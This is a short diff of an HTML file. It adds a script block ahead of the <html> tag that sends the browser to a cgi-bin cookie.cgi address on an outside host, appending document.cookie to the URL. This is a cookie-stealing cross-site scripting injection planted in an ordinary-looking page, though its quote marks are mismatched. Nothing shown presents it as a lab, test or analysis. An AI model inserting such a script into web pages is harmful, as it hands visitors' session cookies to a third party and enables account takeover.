@@ -1,3 +1,6 @@
+<script>document.location=
+    'http://www.abcdefg.com/cgi-bin/cookie.cgi?param=’+document.cookie'
+</script>
 <html>
     
     <head>
